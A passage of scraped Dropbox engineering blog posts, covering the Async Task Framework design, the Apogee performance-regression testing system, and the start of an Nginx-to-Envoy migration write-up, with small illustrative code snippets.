need to support nearly 100 unique async task types from the start, again with room to grow. There were at least two dozen engineering teams that would want to use it for entirely different parts of our codebase, for many products and services. As any engineer would, we Googled to see what other companies with mega-scale services had done to handle async tasks. We were disappointed to find little material published by engineers who built supersized async services. Now that ATF is deployed and currently serving 9,000 async tasks scheduled per second and in use by 28 engineering teams internally, we’re glad to fill that information gap. We’ve documented Dropbox ATF thoroughly, as a reference and guide for the engineering community seeking their own async solutions. Introduction Scheduling asynchronous tasks on-demand is a critical capability that powers many features and internal platforms at Dropbox. Async Task Framework (ATF) is the infrastructural system that supports this capability at Dropbox through a callback-based architecture. ATF enables developers to define callbacks, and schedule tasks that execute against these pre-defined callbacks. Since its introduction over a year ago, ATF has gone on to become an important building block in the Dropbox infrastructure, used by nearly 30 internal teams across our codebase. It currently supports 100+ use cases which require either immediate or delayed task scheduling. Glossary Some basic terms repeatedly used in this post, defined as used in the context of this discussion. Lambda: A callback implementing business logic. Task: Unit of execution of a lambda. Each asynchronous job scheduled with ATF is a task. Collection: A labeled subset of tasks belonging to a lambda. If send email is implemented as a lambda, then password reset email and marketing email would be collections. Priority: Labels defining priority of execution of tasks within a lambda. Features Task scheduling Clients can schedule tasks to execute at a specified time. Tasks can be scheduled for immediate execution, or delayed to fit the use case. Priority based execution Tasks should be associated with a priority. Tasks with higher priority should get executed before tasks with a lower priority once they are ready for execution. Task gating ATF enables the the gating of tasks based on lambda, or a subset of tasks on a lambda based on collection. Tasks can be gated to be completely dropped or paused until a suitable time for execution. Track task status Clients can query the status of a scheduled task. System guarantees At-least once task execution The ATF system guarantees that a task is executed at least once after being scheduled. Execution is said to be complete once the user-defined callback signals task completion to the ATF system. No concurrent task execution The ATF system guarantees that at most one instance of a task will be actively executing at any given in point. This helps users write their callbacks without designing for concurrent execution of the same task from different locations. Isolation Tasks in a given lambda are isolated from the tasks in other lambdas. This isolation spans across several dimensions, including worker capacity for task execution and resource use for task scheduling. Tasks on the same lambda but different priority levels are also isolated in their resource use for task scheduling. Delivery latency 95% of tasks begin execution within five seconds from their scheduled execution time. High availability for task scheduling The ATF service is 99.9% available to accept task scheduling requests from any client. Lambda requirements Following are some restrictions we place on the callback logic (lambda): Idempotence A single task on a lambda can be executed multiple times within the ATF system. Developers should ensure that their lambda logic and correctness of task execution in clients are not affected by this. Resiliency Worker processes which execute tasks might die at any point during task execution. ATF retries abruptly interrupted tasks, which could also be retried on different hosts. Lambda owners must design their lambdas such that retries on different hosts do not affect lambda correctness. Terminal state handling ATF retries tasks until they are signaled to be complete from the lambda logic. Client code can mark a task as successfully completed, fatally terminated, or retriable. It is critical that lambda owners design clients to signal task completion appropriately to avoid misbehavior such as infinite retries. Architecture Async Task Framework (ATF) [Fig 1] In this section, we describe the high-level architecture of ATF and give brief description of its different components. (See Fig. 1 above.) In this section, we describe the high-level architecture of ATF and give brief description of its different components. (See Fig. 1 above.) Dropbox uses gRPC for remote calls and our in-house Edgestore to store tasks. ATF consists of the following components: Frontend Task Store Store Consumer Queue Controller Executor Heartbeat and Status Controller (HSC) Frontend This is the service that schedules requests via an RPC interface. The frontend accepts RPC requests from clients and schedules tasks by interacting with ATF’s task store described below. Task Store ATF tasks are stored in and triggered from the task store. The task store could be any generic data store with indexed querying capability. In ATF’s case, We use our in-house metadata store Edgestore to power the task store. More details can be found in the D ata M odel section below. Store Consumer The Store Consumer is a service that periodically polls the task store to find tasks that are ready for execution and pushes them onto the right queues, as described in the queue section below. These could be tasks that are newly ready for execution, or older tasks that are ready for execution again because they either failed in a retriable way on execution, or were dropped elsewhere within the ATF system. Below is a simple walkthrough of the Store Consumer’s function: Copy repeat every second:\r\n  1. poll tasks ready for execution from task store\r\n  2. push tasks onto the right queues\r\n  3. update task statuses The Store Consumer polls tasks that failed in earlier execution attempts. This helps with the at-least-once guarantee that the ATF system provides. More details on how the Store Consumer polls new and previously failed tasks is presented in the Lifecycle of a task section below. Queue ATF uses AWS Simple Queue Service (SQS) to queue tasks internally. These queues act as a buffer between the Store Consumer and Controllers (described below). Each <lambda, priority> pair gets a dedicated SQS queue. The total number of SQS queues used by ATF is #lambdas x #priorities . Controller Worker hosts are physical hosts dedicated for task execution. Each worker host has one controller process responsible for polling tasks from SQS queues in a background thread, and then pushing them onto process local buffered queues. The Controller is only aware of the lambdas it is serving and thus polls only the limited set of necessary queues. The Controller serves tasks from its process local queue as a response to NextWork RPCs. This is the layer where execution level task prioritization occurs. The Controller has different process level queues for tasks of different priorities and can thus prioritize tasks in response to NextWork RPCs. Executor The Executor is a process with multiple threads, responsible for the actual task execution. Each thread within an Executor process follows this simple loop: Copy while True:\r\n  w = get_next_work()\r\n  do_work(w) Each worker host has a single Controller process and multiple executor processes. Both the Controller and Executors work in a “pull” model, in which active loops continuously long-poll for new work to be done. Heartbeat and Status Controller (HSC) The HSC serves RPCs for claiming a task for execution ( ClaimTask ), setting task status after execution ( SetResults ) and heartbeats during task execution ( Heartbeat ). ClaimTask requests originate from the Controllers in response to NextWork requests. Heartbeat and SetResults requests originate from executor processes during and after task execution. The HSC interacts with the task store to update the task status on the kind of request it receives. Data model ATF uses our in-house metadata store, Edgestore, as a task store. Edgestore objects can be Entities or Associations ( assoc ), each of which can have user-defined attributes. Associations are used to represent relationships between entities. Edgestore supports indexing only on attributes of associations. Based on this design, we have two kinds of ATF-related objects in Edgestore. The ATF association stores scheduling information, such as the next scheduled timestamp at which the Store Consumer should poll a given task (either for the first time or for a retry). The ATF entity stores all task related information that is used to track the task state and payload for task execution. We query on associations from the Store Consumer in a pull model to pick up tasks ready for execution. Lifecycle of a task Client performs a Schedule RPC call to Frontend with task information, including execution time. Frontend creates Edgestore entity and assoc for the task. When it is time to process the task, Store Consumer pulls the task from Edgestore and pushes it to a related SQS queue. Executor makes NextWork RPC call to Controller , which pulls tasks from the SQS queue, makes a ClaimTask RPC to the HSC and then returns the task to the Executor . Executor invokes the callback for the task. While processing, Executor performs Heartbeat RPC calls to Heartbeat and Status Controller (HSC) . Once processing is done, Executor performs TaskStatus RPC call to HSC . Upon getting Heartbeat and TaskStatus RPC calls, HSC updates the Edgestore entity and assoc . Every state update in the lifecycle of a task is accompanied by an update to the next trigger timestamp in the assoc . This ensures that the Store Consumer pulls the task again if there is no change in state of the task within the next trigger timestamp. This helps ATF achieve its at-least-once delivery guarantee by ensuring that no task is dropped. Following are the task entity and association states in ATF and their corresponding timestamp updates: Entity status Assoc status next trigger timestamp in Assoc Comment new new scheduled_timestamp of the task Pick up new tasks that are ready. enqueued started enqueued_timestamp + enqueue_timeout Re-enqueue task if it has been in enqueued state for too long. This can happen if the queue loses data or the controller goes down after polling the queue and before the task is claimed. claimed started claimed_timestamp + claim_timeout Re-enqueue if task is claimed but never transfered to processing . This can happen if Controller is down after claiming a task. Task status is changed to enqueued after re-enqueue. processing started heartbeat_timestamp + heartbeat_timeout ` Re-enqueue if task hasn’t sent heartbeat for too long. This can happen if Executor is down. Task status is changed to enqueued after re-enqueue. retriable failure started compute next_timestamp according to backoff logic Exponential backoff for tasks with retriable failure. success completed N/A fatal_failure completed N/A The store consumer polls for tasks based on the following query: assoc_status= && next_timestamp<=time.now() Below is the state machine that defines task state transitions: Achieving guarantees At-least-once task execution At-least-once execution is guaranteed in ATF by retrying a task until it completes execution (which is signaled by a Success or a FatalFailure state). All ATF system errors are implicitly considered retriable failures, and lambda owners have an option of marking tasks with a RetriableFailure state. Tasks might be dropped from the ATF execution pipeline in different parts of the system through transient RPC failures and failures on dependencies like Edgestore or SQS. These transient failures at different parts of the system do not affect the at-least-once guarantee, though, because of the system of timeouts and re-polling from Store Consumer. No concurrent task execution Concurrent task execution is avoided through a combination of two methods in ATF. First, tasks are explicitly claimed through an exclusive task state ( Claimed ) before starting execution. Once the task execution is complete, the task status is updated to one of Success , FatalFailure or RetriableFailure . A task can be claimed only if its existing task state is Enqueued (retried tasks go to the Enqueued state as well once they are re-pushed onto SQS). However, there might be situations where once a long running task starts execution, its heartbeats might fail repeatedly yet the task execution continues. ATF would retry this task by polling it from the store consumer because the heartbeat timeouts would’ve expired. This task can then be claimed by another worker and lead to concurrent execution. To avoid this situation, there is a termination logic in the Executor processes whereby an Executor process terminates itself as soon as three consecutive heartbeat calls fail. Each heartbeat timeout is large enough to eclipse three consecutive heartbeat failures. This ensures that the Store Consumer cannot pull such tasks before the termination logic ends them—the second method that helps achieve this guarantee. Isolation Isolation of lambdas is achieved through dedicated worker clusters, dedicated queues, and dedicated per-lambda scheduling quotas. In addition, isolation across different priorities within the same lambda is likewise achieved through dedicated queues and scheduling bandwidth. Delivery latency ATF use cases do not require ultra-low task delivery latencies. Task delivery latencies on the order of a couple of seconds are acceptable. Tasks ready for execution are periodically polled by the Store Consumer and this period of polling largely controls the task delivery latency. Using this as a tuning lever, ATF can achieve different delivery latencies as required. Increasing poll frequency reduces task delivery latency and vice versa. Currently, we have calibrated ATF to poll for ready tasks once every two seconds. Ownership model ATF is designed to be a self-serve framework for developers at Dropbox. The design is very intentional in driving an ownership model where lambda owners own all aspects of their lambdas’ operations. To promote this, all lambda worker clusters are owned by the lambda owners. They have full control over operations on these clusters, including code deployments and capacity management. Each executor process is bound to one lambda. Owners have the option of deploying multiple lambdas on their worker clusters simply by spawning new executor processes on their hosts. Extending ATF As described above, ATF provides an infrastructural building block for scheduling asynchronous tasks. With this foundation established, ATF can be extended to support more generic use cases and provide more features as a framework. Following are some examples of what could be built as an extension to ATF. Periodic task execution Currently, ATF is a system for one-time task scheduling. Building support for periodic task execution as an extension to this framework would be useful in unlocking new capabilities for our clients. Better support for task chaining Currently, it is possible to chain tasks on ATF by scheduling a task onto ATF that then schedules other tasks onto ATF during its execution. Although it is possible to do this in the current ATF setup, visibility and control on this chaining is absent at the framework level. Another natural extension here would be to better support task chaining through framework-level visibility and control, to make this use case a first class concept in the ATF model. Dead letter queues for misbehaving tasks One common source of maintenance overhead we observe on ATF is that some tasks get stuck in infinite retry loops due to occasional bugs in lambda logic. This requires manual intervention from the ATF framework owners in some cases where there are a large number of tasks stuck in such loops, occupying a lot of the scheduling bandwidth in the system. Typical manual actions in response to such a situation include pausing execution of the lambdas with misbehaving tasks, or dropping them outright. One way to reduce this operational overhead and provide an easy interface for lambda owners to recover from such incidents would be to create dead letter queues filled with such misbehaving tasks. The ATF framework could impose a maximum number of retries before tasks are pushed onto the dead letter queue. We could create and expose tools that make it easy to reschedule tasks from the dead letter queue back into the ATF system, once the associated lambda bugs are fixed. Conclusion We hope this post helps engineers elsewhere to develop better async task frameworks of their own. Many thanks to everyone who worked on this project: Anirudh Jayakumar, Deepak Gupta, Dmitry Kopytkov, Koundinya Muppalla, Peng Kang, Rajiv Desai, Ryan Armstrong, Steve Rodrigues, Thomissa Comellas, Xiaonan Zhang and Yuhuan Du. // Tags Infrastructure Task Scheduling Async Edgestore // Copy link Link copied Link copied", "date": "2020-11-11"},
{"website": "Dropbox", "title": "Keeping sync fast with automated performance regression detection", "author": ["Rishabh Jain"], "link": "https://dropbox.tech/infrastructure/keeping-sync-fast-with-automated-performance-regression-detectio", "abstract": "Design Reducing variability Results Conclusion Future work Acknowledgements Sync is a hard distributed systems problem and re-writing the heart of our sync engine on the desktop client was a monumental effort. We’ve previously discussed our efforts to heavily test durability at different layers of the system. Today, we are going to talk about how we ensured the performance of our new sync engine. In particular, we describe a performance regression testing framework we call Apogee. Apogee helps us find unanticipated performance issues in the development process and safeguard against bugs that we would otherwise release to our users. As we developed our new sync engine, we used Apogee to compare the performance of new vs. old, ensuring that the Dropbox sync experience didn’t suffer when we rolled Nucleus out to our users. When we specifically sought to improve sync performance, we used Apogee as pre-release validation that our improvements had the intended impact. In this post, we’ll be covering Apogee’s system design, how we overcame challenges we faced while building it, and finish by discussing a few performance regressions it caught for us over the past two years. Design Apogee measures performance metrics (latency, cpu usage, disk i/o, memory usage, and network i/o) while running our existing end-to-end integration tests. In tests, this looks like a context manager that can be placed above a span of sync operations. The profile data can be annotated with key-value pairs that allow us to slice results based on the activity being profiled. Copy def performance_test(...):\r\n  # Internally, this uses a timer for latency calculation and DTrace for counting\r\n  # the performance metrics such as disk i/o, network i/o, syscalls etc. \r\n  with apogee_profile():\r\n    do_something()\r\n    # `annotate` allows for adding attributions to the profile report generated \r\n    # by `apogee_profile`. For example: annotate(\"num_files\": 10000)\r\n    annotate(\"key\", \"value\") Our CI infrastructure automatically triggers these performance integration tests for every new commit, or periodically for some of the more expensive tests. Apogee aggregates and graphs the results. The data pipeline is as follows: Apogee: Data pipeline CI The CI system at Dropbox allows for running custom test suites on all new commits. It produces the results of the builds to a Kafka topic, which we tail to retrieve the build artifacts, which include our profile data and test logs. The CI runs the integration tests across a pool of virtual machines that are managed by a hypervisor , which schedules these VMs with limited and shared critical resources such as memory, CPU, and network. Aggregation service This is a simple service, a Kafka consumer, that tails the relevant topic, aggregates the measurements from the build artifacts, and adds custom fields not available at test time such as link to the build, commit hash, author, link to logs etc. Once all the information around a build is aggregated, it writes the result to our time series database. InfluxDB and Grafana We use InfluxDB for our time series data persistence, as we are familiar with it. The interface is compatible with the shape of our metrics, and it has a well-tested plugin for the data visualization tool we use at Dropbox, Grafana . The InfluxDB protocol allows you to write alphanumeric fields (eg. latency, disk writes, commit hash, etc.) for a unique set of tag key-value pairs added in the tests with annotate() , (eg. {\"operation\": \"upload\", \"num_files\": \"1000, \"size\": \"1024\"} ) and timestamp (in our case, this was timestamp of the build). Reducing variability The key challenge in developing Apogee was defeating measurement variability. Before Apogee could reliably detect performance regressions between two different commits, we needed to prove that it could get consistent results when run multiple times on the same code. After building out the system described above, it was obvious that there was too much noise in our measurements to detect even large performance regressions, as measurement noise obscured any effects caused by code changes. If Apogee was going to be at all useful, we would need to invest heavily in driving down measurement variability when running repeatedly on the same code. Above: Massive variability across test (uploading 10K files of 1kB) runs;   Below: Coefficient of variation (CoV) of the duration Challenges Many factors in our problem space made driving down performance measurement variability challenging. Test environment and platform Dropbox runs across different platforms (MacOS, Windows, Linux) and so do our tests. Some of the areas of variability here were: Different tracing libraries and abilities (e.g. DTrace wasn’t available on Win when we built this but it now is :) Our CI system’s Mac VMs ran on racked MacPros, but Windows and Linux VMs ran on Dell blades Real-world fidelity vs artificial repeatability We constantly found ourselves navigating a fundamental tension between wanting to provide useful simulation of real-user environments while simultaneously reducing noise and variability. Some of the challenges are as follows: Managing the explosion of variables Network disk vs. spinning disk vs. flash disk vs. RAMDisk Different network speeds, noise, and packet corruption rate Processor speed, cache size, memory, and interrupts/de-scheduling Using virtual machines vs. bare metal hardware Usually companies use dedicated performance labs with bare metal hardware Running against production server vs. dev server Principles Some of the principles we kept in mind when thinking about these challenges and the tradeoffs that came with them were: Don’t aim on becoming the panacea Focus on the problem that matters the most in order to reduce the complexity that comes with solving all problems that the system could potentially solve Repeatability is key Strive to keep the simulations as close to reality as possible but prefer artificial repeatability over real world fidelity if we have to pick one Make incremental progress Given this multivariate space, first hold as many variables as possible constant, and only when we have confidence in the fidelity of these try varying more Methodology To help point us in the right direction early on, we ran the same sync tests over and over while profiling the client. We then merged all of these profiles and identified areas of code that had the highest variabilities in wall time, network i/o, disk i/o, and memory usage. We took duration as the first metric that we wanted to reduce the variability for. To understand where the variability was coming from, we used the coefficient of variation of other metrics (network i/o, disk i/o, and memory usage) to correlate it with that of the duration using the t-test . We tackled each of the highly-correlated and high-variability areas in order from most to least variable by reading the profiles and code, developing hypotheses, and running experiments to see the effect of various interventions on variability. Among the various strategies we employed, let’s walk through some of the ones that worked. Application layer variance Static sharding of tests To be able to effectively run hundreds of thousands of tests, our CI generally uses dynamic sharding to efficiently distribute the load across the machines tests are run on. Pinning a subset of tests together for each run helped reduce the variability across runs. Dropbox headless mode Our main focus was on measuring sync performance, namely the work that happens between adding or editing files and when they’re fully synced. Our early measurements quickly identified that a large source of performance variability happened in the desktop client user interface. Things like rendering notifications and waiting for web views to load turned out to take a surprisingly unpredictable amount of time. It is also important to note that the system we were trying to test, the sync engine, did not depend on any of these components. Turning off the Dropbox desktop UI entirely and running in headless mode was one one of the biggest variability wins we got. Non-determinism While the sync engine proper now has deterministic execution, there were still certain areas of non-determinism, mainly in the form of server side rate limiting, backoffs, and timeouts. Running the tests against the stage variant of the our server reduced the chance of hitting these non-deterministic cases as it was usually under lesser load. We evaluated running it against another VM that ran all the essential backend services, but it meant that we lost some coverage on our network path. The variance from the non-determinism coming from the real server was low enough that we decided to go ahead with that. Infrastructural variance Homogenous VMs Originally the hypervisor was tuned to share resources between child VMs to optimize for overall throughput. This meant it could provide unbalanced resources to VMs and de-schedule them as necessary. We tuned the hypervisor to make the control flow deterministic by fiddling with a few knobs, as follows: Processor affinity and memory reservation: Gave each VM its own dedicated resources so there is less contention in the pool. This helps with CPU cache performance and better simulates running on bare metal. High latency sensitivity: Adjusted to optimize scheduling delay to better serve low latency needs of the application. Disable clock sync: Disallowed the VM to spend time synchronizing clocks with hosts. If the VM spends time de-scheduled, then that would not be counted towards test timing. RAM disks Our CI system’s infrastructure used remote racks of flash-based drives to host client VMs, so all disk writes were actually sent out over the network. This meant that any disk i/o was potentially extremely variable. Our server storage infrastructure allowed us to bound the network resources used by any one VM so they couldn’t interfere with each-other, but this didn’t give us the reduction we wanted. Because this was already such an unusual i/o situation (most of our users don’t host their Dropbox instances on VM-tuned network attached storage), we decided that swapping it out for another artificial yet more predictable storage solution would be preferable. We moved to using RAM disks. By mounting a portion of physical memory as if it were a hard drive and preventing that memory segment from being paged out, we were able to keep disk reads and writes made by our sync engine on the VM host—no more round trip across the data center. This turned out to be a huge variability win, and also made Dropbox sync faster, but this was concerning, because we’d now made ourselves blind to an important class of potential performance issues. For example, f-syncing was now near instantaneous, so quadrupling the number of f-syncs wouldn’t affect our measurements, even though it would almost certainly impact customer experience. We’d be similarly ignorant of pathological access patterns that would tank performance on spinning disks or poorly utilize disk cache. However, we decided that this was a tradeoff worth making. We were also saved by tracking disk i/o and sync latency separately. Depending on the problem, we’d be able to observe a regression in disk performance even if we didn’t see sync taking longer. Terminating background processes Once we ran out of large sources of variability within Dropbox itself, we turned our attention to the broader environment in which it was running, and in particular other processes with which Dropbox was contending for resources. When we instrumented all processes running in the VM during our tests, we noticed that Dropbox scheduler preemptions and disk cache misses were highly correlated with a small subset of other processes running simultaneously. We got a modest variability win by terminating these troublesome processes before starting our tests. For example, we noticed a common pattern on MacOS where Spotlight would race with Dropbox to index files newly added by our test logic. When the two were out of phase, it ruined disk cache performance, which surfaced as a far higher rate of disk i/o. While this certainly was a concern for improving Dropbox sync performance on Mac, Apogee’s main focus is on catching regressions in Dropbox code itself, so reducing variability won out. Spotlight was banned from our test environment. Results With all the work above, we were able to get the variability down from 60% in the worst case to less than 5% for our all of our tests. This means we can confidently detect 5% or greater regressions. We were able to improve this further by rejecting one outlier per five runs of a test to give us more confidence when alerting on regressions. While we used this scheme in our alerting, we still wanted to graph the outliers as they can often point out systemic regressions and faults in our infrastructure. We built a comprehensive dashboard that developers could use to diagnose what was going wrong in test runs. Consistent results with low coefficient of variation Caught regressions Now let’s walk through some our favorite regressions that Apogee caught for us. Slowdown coming from using a third party hash map implementation, which internally used a weak hashing scheme. This led to correlated entries getting bucketed together and thereby increasing insertion and lookup cost from constant time to linear time. Regression in downloading 10,000 files of 1kB each due to using a weak hash function Disk writes fell drastically indicating almost no work was being done and possible deadlock/livelock Using unbounded concurrency leading to a ~50% regression in sync duration coupled with excessive memory and CPU usage Performance regression in duration and corresponding fix Memory usage spiked as we were using an unbounded queue CPU usage spiked as we were queuing tasks inefficiently A sequence of events involving iterating on a set (seeded with an RNG) and removing the element from a map (using the same seed) led to inefficient removal, triggering collisions when the map was resized, ultimately yielding high latency lookups . Possible fixes included resizing more efficiently or using a better map implementation, such as BTreeMap (we ended up using the latter) Scale tests timing out Spike in CPU usage as due to high latency in lookups Number of syscalls fell drastically as we didn’t make enough progress and the test timed out Using incompatible window size and frame sizes for high bandwidth and high latency connections when we first switched to a GRPC powered network stack led to request cancellations under high load Regression in downloading 10,000 files of 1kB Fewer packets sent due to high number of cancellations. Memory usage spike because we were now processing more tasks than usual and not making progress on most of them. Conclusion Before Apogee, we only got visibility into performance issues through CX complaints of users hitting pathological cases. Reproducibility is often hard in these situations as you might not have the evidence you need to exactly trigger what the end user might be facing, especially when it comes to performance issues. Even if you do manage to find the cause, fixing regressions weeks (or sometimes months) after the offending code was originally pushed is time consuming as you need to rebuild all the context. You could have multiple commits building on top of the main issue that could make it challenging to simply revert the code. If this bug is in the data model or persistence layer then you might be forced to run an expensive migration to fix it. Apogee sidesteps this unpleasant flow by warning us of performance regressions before they affect even a single customer. It goes a step further by providing clear evidence in the form of logs and other supplementary metrics. Engineers can run the performance test locally on their development machine to reproduce the issue, inspect the state of the sync engine in real time, and follow up with targeted benchmarks to zero in on the root cause. Apogee has also been crucial in finding faults in Dropbox code that only come at scale. It has helped us catch long-standing bugs, and identify regressions added to various areas within the sync engine. The examples mentioned above include pointing out inefficient ways of storing data, finding limitations in our asynchronous and concurrent code, catching bugs in third party libraries, and helping us roll out a brand new network stack. Apart from finding regressions and confirming the fixes, the system also constantly validates new performance improvements we make and then holds us accountable to that newly set bar. Future work Over the course of the sync engine rewrite we made tremendous progress in the testing realm and we now have several stable and proven frameworks for testing sync. While Apogee tests sync at a very high level, we are now adding performance testing at the lower level testing layers. These tests are cheaper to write, run, and manage. It allows us to be more sophisticated in our testing because we have a lot more visibility into what the sync engine is doing. Acknowledgements We want to acknowledge all the previous and current members of the sync team and the emeritus of the sync performance team, specifically Ben Newhouse and Marc Sherry. We want to also thank the members of the partner teams that supported us in the process of building this system. // Tags Infrastructure Sync Performance // Copy link Link copied Link copied", "date": "2020-08-19"},
{"website": "Dropbox", "title": "How we migrated Dropbox from Nginx to Envoy", "author": ["Alexey Ivanov"], "link": "https://dropbox.tech/infrastructure/how-we-migrated-dropbox-from-nginx-to-envoy", "abstract": "Our legacy Nginx-based traffic infrastructure Why not Bandaid? Our new Envoy-based traffic infrastructure Current state of our migration Issues we encountered What’s next? Acknowledgements We’re hiring! In this blogpost we’ll talk about the old Nginx-based traffic infrastructure, its pain points, and the benefits we gained by migrating to Envoy . We’ll compare Nginx to Envoy across many software engineering and operational dimensions. We’ll also briefly touch on the migration process, its current state, and some of the problems encountered on the way. When we moved most of Dropbox traffic to Envoy, we had to seamlessly migrate a system that already handles tens of millions of open connections, millions of requests per second, and terabits of bandwidth. This effectively made us into one of the biggest Envoy users in the world. Disclaimer: although we’ve tried to remain objective, quite a few of these comparisons are specific to Dropbox and the way our software development works: making bets on Bazel, gRPC, and C++/Golang. Also note that we’ll cover the open source version of the Nginx, not its commercial version with additional features. Our legacy Nginx-based traffic infrastructure Our Nginx configuration was mostly static and rendered with a combination of Python2, Jinja2, and YAML. Any change to it required a full re-deployment. All dynamic parts, such as upstream management and a stats exporter, were written in Lua. Any sufficiently complex logic was moved to the next proxy layer, written in Go . Our post, “ Dropbox traffic infrastructure: Edge network ,” has a section about our legacy Nginx-based infrastructure. Nginx served us well for almost a decade. But it didn’t adapt to our current development best-practices: Our internal and (private) external APIs are gradually migrating from REST to gRPC which requires all sorts of transcoding features from proxies. Protocol buffers became de facto standard for service definitions and configurations. All software, regardless of the language, is built and tested with Bazel. Heavy involvement of our engineers on essential infrastructure projects in the open source community. Also, operationally Nginx was quite expensive to maintain: Config generation logic was too flexible and split between YAML, Jinja2, and Python. Monitoring was a mix of Lua, log parsing, and system-based monitoring. An increased reliance on third party modules affected stability, performance, and the cost of subsequent upgrades. Nginx deployment and process management was quite different from the rest of the services. It relied a lot on other systems’ configurations: syslog, logrotate, etc, as opposed to being fully separate from the base system. With all of that, for the first time in 10 years, we started looking for a potential replacement for Nginx. Why not Bandaid? As we frequently mention, internally we rely heavily on the Golang-based proxy called Bandaid . It has a great integration with Dropbox infrastructure, because it has access to the vast ecosystem of internal Golang libraries: monitoring, service discoveries, rate limiting, etc. We considered migrating from Nginx to Bandaid but there are a couple of issues that prevent us from doing that: Golang is more resource intensive than C/C++. Low resource usage is especially important for us on the Edge since we can’t easily “auto-scale” our deployments there. CPU overhead mostly comes from GC, HTTP parser and TLS, with the latter being less optimized than BoringSSL used by Nginx/Envoy. The “goroutine-per-request” model and GC overhead greatly increase memory requirements in high-connection services like ours. No FIPS support for Go’s TLS stack. Bandaid does not have a community outside of Dropbox, which means that we can only rely on ourself for feature development. With all that we’ve decided to start migrating our traffic infrastructure to Envoy instead. Our new Envoy-based traffic infrastructure Let’s look into the main development and operational dimensions one by one, to see why we think Envoy is a better choice for us and what we gained by moving from Nginx to Envoy. Performance Nginx’s architecture is event-driven and multi-process. It has support for SO_REUSEPORT , EPOLLEXCLUSIVE , and worker-to-CPU pinning. Although it is event-loop based, is it not fully non-blocking. This means some operations, like opening a file or access/error logging, can potentially cause an event-loop stall ( even with aio , aio_write, and thread pools enabled .) This leads to increased tail latencies, which can cause multi-second delays on spinning disk drives. Envoy has a similar event-driven architecture, except it uses threads instead of processes. It also has SO_REUSEPORT support (with a BPF filter support) and relies on libevent for event loop implementation (in other words, no fancy epoll(2) features like EPOLLEXCLUSIVE .) Envoy does not have any blocking IO operations in the event loop. Even logging is implemented in a non-blocking way, so that it does not cause stalls. It looks like in theory Nginx and Envoy should have similar performance characteristics. But hope is not our strategy, so our first step was to run a diverse set of workload tests against similarly tuned Nginx and Envoy setups. If you are interested in performance tuning, we describe our standard tuning guidelines in “ Optimizing web servers for high throughput and low latency .” It involves everything from picking the hardware, to OS tunables, to library choices and web server configuration. Our test results showed similar performance between Nginx and Envoy under most of our test workloads: high requests per second (RPS), high bandwidth, and a mixed low-latency/high-bandwidth gRPC proxying. It is arguably very hard to make a good performance test. Nginx has guidelines for performance testing , but these are not codified. Envoy also has a guideline for benchmarking , and even some tooling under the envoy -perf project, but sadly the latter looks unmaintained. We resorted to using our internal testing tool. It’s called “hulk” because of its reputation for smashing our services. That said, there were a couple of notable differences in results: Nginx showed higher long tail latencies. This was mostly due to event loops stalls under heavy I/O, especially if used together with SO_REUSEPORT since in that case connections can be accepted on behalf of a currently blocked worker . Nginx performance without stats collections is on par with Envoy, but our Lua stats collection slowed Nginx on the high-RPS test by a factor of 3. This was expected given our reliance on lua_shared_dict , which is synchronized across workers with a mutex. We do understand how inefficient our stats collection was. We considered implementing something akin to FreeBSD’s counter(9) in userspace: CPU pinning, per-worker lockless counters with a fetching routine that loops through all workers aggregating their individual stats. But we gave up on this idea, because if we wanted to instrument Nginx internals (e.g. all error conditions), it would mean supporting an enormous patch that would make subsequent upgrades a true hell. Since Envoy does not suffer from either of these issues, after migrating to it we were able to release up to 60% of servers previously exclusively occupied by Nginx. Observability Observability is the most fundamental operational need for any product, but especially for such a foundational piece of infrastructure as a proxy. It is even more important during the migration period, so that any issue can be detected by the monitoring system rather than reported by frustrated users. Non-commercial Nginx comes with a “ stub status ” module that has 7 stats: Copy Active connections: 291 \r\nserver accepts handled requests\r\n 16630948 16630948 31070465 \r\nReading: 6 Writing: 179 Waiting: 106 This was definitely not enough, so we’ve added a simple log_by_lua handler that adds per-request stats based on headers and variables that are available in Lua: status codes, sizes, cache hits, etc. Here is an example of a simple stats-emitting function: Copy function _M.cache_hit_stats(stat)\r\n    if _var.upstream_cache_status then\r\n        if _var.upstream_cache_status == \"HIT\" then\r\n            stat:add(\"upstream_cache_hit\")\r\n        else\r\n            stat:add(\"upstream_cache_miss\")\r\n        end\r\n    end\r\nend In addition to the per-request Lua stats, we also had a very brittle error.log parser that was responsible for upstream, http, Lua, and TLS error classification. On top of all that, we had a separate exporter for gathering Nginx internal state: time since the last reload, number of workers, RSS/VMS sizes, TLS certificate ages, etc. A typical Envoy setup provides us thousands of distinct metrics (in prometheus format ) describing both proxied traffic and server’s internal state: Copy $ curl -s http://localhost:3990/stats/prometheus | wc -l\r\n14819 This includes a myriad of stats with different aggregations: Per-cluster/per-upstream/per-vhost HTTP stats, including connection pool info and various timing histograms. Per-listener TCP/HTTP/TLS downstream connection stats. Various internal/runtime stats from basic version info and uptime to memory allocator stats and deprecated feature usage counters. A special shoutout is needed for Envoy’s admin interface . Not only does it provide additional structured stats through /certs , /clusters , and /config_dump endpoints, but there are also very important operational features: The ability to change error logging on the fly through /logging . This allowed us to troubleshoot fairly obscure problems in a matter of minutes. /cpuprofiler , /heapprofiler , /contention which would surely be quite useful during the inevitable performance troubleshooting. /runtime_modify endpoint allows us to change set of configuration parameters without pushing new configuration, which could be used in feature gating, etc. In addition to stats, Envoy also supports pluggable tracing providers . This is useful not only to our Traffic team, who own multiple load-balancing tiers, but also for application developers who want to track request latencies end-to-end from the edge to app servers. Technically, Nginx also supports tracing through a third-party OpenTracing integration , but it is not under heavy development. And last but not least, Envoy has the ability to stream access logs over gRPC . This removes the burden of supporting syslog-to-hive bridges from our Traffic team. Besides, it’s way easier (and secure!) to spin up a generic gRPC service in Dropbox production than to add a custom TCP/UDP listener. Configuration of access logging in Envoy, like everything else, happens through a gRPC management service, the Access Log Service (ALS). Management services are the standard way of integrating the Envoy data plane with various services in production. This brings us to our next topic. Integration Nginx’s approach to integration is best described as “Unix-ish.” Configuration is very static. It heavily relies on files (e.g. the config file itself, TLS certificates and tickets, allowlists/blocklists, etc.) and well-known industry protocols ( logging to syslog and auth sub-requests through HTTP). Such simplicity and backwards compatibility is a good thing for small setups, since Nginx can be easily automated with a couple of shell scripts. But as the system’s scale increases, testability and standardization become more important. Envoy is far more opinionated in how the traffic dataplane should be integrated with its control plane, and hence with the rest of infrastructure. It encourages the use of protobufs and gRPC by providing a stable API commonly referred as xDS . Envoy discovers its dynamic resources by querying one or more of these xDS services . Nowadays, the xDS APIs are evolving beyond Envoy: Universal D ata Plane API (UDPA) has the ambitious goal of “becoming de facto standard of L4/L7 